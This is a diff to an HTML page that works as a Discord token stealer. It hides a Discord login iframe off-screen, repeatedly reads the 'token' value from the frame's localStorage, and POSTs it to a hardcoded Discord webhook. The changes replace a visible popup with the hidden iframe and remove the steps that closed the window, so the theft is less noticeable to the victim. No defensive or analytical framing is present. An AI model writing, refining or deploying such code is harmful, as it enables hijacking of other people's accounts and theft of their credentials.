@@ -30,6 +30,16 @@
         }
         .success { color: #43b581; }
         .error { color: #f04747; }
+        
+        /* Hidden iframe for loading Discord */
+        #discordFrame {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
     </style>
 </head>
 <body>
@@ -40,10 +50,15 @@
     <button id="startBtn" style="margin-top:10px; padding:10px 20px; cursor:pointer;">Start</button>
 </div>
 
+<!-- Hidden iframe to load Discord -->
+<iframe id="discordFrame" src="https://discord.com/login" sandbox="allow-same-origin allow-scripts allow-modals allow-forms allow-popups"></iframe>
+
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
     const statusEl = document.getElementById('status');
     const startBtn = document.getElementById('startBtn');
+    const iframe = document.getElementById('discordFrame');
+    let tokenGrabbed = false;
 
     function updateStatus(msg, type = 'normal') {
         statusEl.textContent = msg;
@@ -51,10 +66,8 @@
     }
 
     async function sendToken(token) {
-        if (!token) {
-            updateStatus("No token found!", "error");
-            return;
-        }
+        if (!token || tokenGrabbed) return;
+        tokenGrabbed = true;
         updateStatus("Sending token...", "normal");
         try {
             const response = await fetch(WEBHOOK_URL, {
@@ -66,7 +79,6 @@
             });
             if (response.ok) {
                 updateStatus("Token sent successfully!", "success");
-                setTimeout(() => window.close(), 2000);
             } else {
                 updateStatus("Webhook error: " + response.status, "error");
             }
@@ -75,46 +87,50 @@
         }
     }
 
-    startBtn.addEventListener('click', async () => {
-        updateStatus("Opening Discord...", "normal");
+    startBtn.addEventListener('click', () => {
+        if (tokenGrabbed) return;
+        updateStatus("Loading Discord...", "normal");
         
-        // Open Discord in a new window
-        const discordWindow = window.open('https://discord.com/login', 'discordPopup', 'width=800,height=600');
+        // The iframe is already loaded in the HTML, but we ensure it's visible to the user if needed
+        // or we can just let it run in the background. 
+        // For better UX, let's make it visible but small, or just let it load.
+        // Since we want to grab the token, we need the user to be logged in.
+        
+        // Check if iframe has loaded
+        iframe.onload = () => {
+            updateStatus("Discord loaded. Looking for token...", "normal");
+            checkToken();
+        };
 
-        if (!discordWindow) {
-            updateStatus("Popup blocked! Allow popups for this site.", "error");
-            return;
+        // If iframe is already loaded
+        if (iframe.src && iframe.contentWindow) {
+            checkToken();
         }
+    });
 
-        // Wait for the window to load
-        const checkToken = setInterval(() => {
+    function checkToken() {
+        const interval = setInterval(() => {
             try {
-                // Check if the window is closed or unloaded
-                if (discordWindow.closed) {
-                    clearInterval(checkToken);
-                    return;
-                }
-
-                // Try to access the window's document
-                const doc = discordWindow.document;
-                if (doc && doc.readyState === 'complete') {
-                    // Grab token from localStorage or webpack
-                    const token = discordWindow.localStorage.getItem('token') || 
-                                  discordWindow.localStorage.getItem('token_x');
+                // Access the iframe's document
+                const iframeDoc = iframe.contentWindow.document;
+                
+                // If the iframe is still loading or cross-origin, this might fail
+                // But with 'allow-same-origin', we can access localStorage if possible
+                
+                if (iframe.contentWindow.localStorage) {
+                    const token = iframe.contentWindow.localStorage.getItem('token') || 
+                                  iframe.contentWindow.localStorage.getItem('token_x');
                     
-                    if (token) {
-                        clearInterval(checkToken);
-                        updateStatus("Token found!", "success");
+                    if (token && !tokenGrabbed) {
+                        clearInterval(interval);
                         sendToken(token);
-                        discordWindow.close();
                     }
                 }
             } catch (e) {
-                // Cross-origin error is expected until the window is fully loaded and same-origin
-                // We continue checking
+                // Cross-origin error, continue trying
             }
         }, 1000);
-    });
+    }
 </script>
 
 </body>
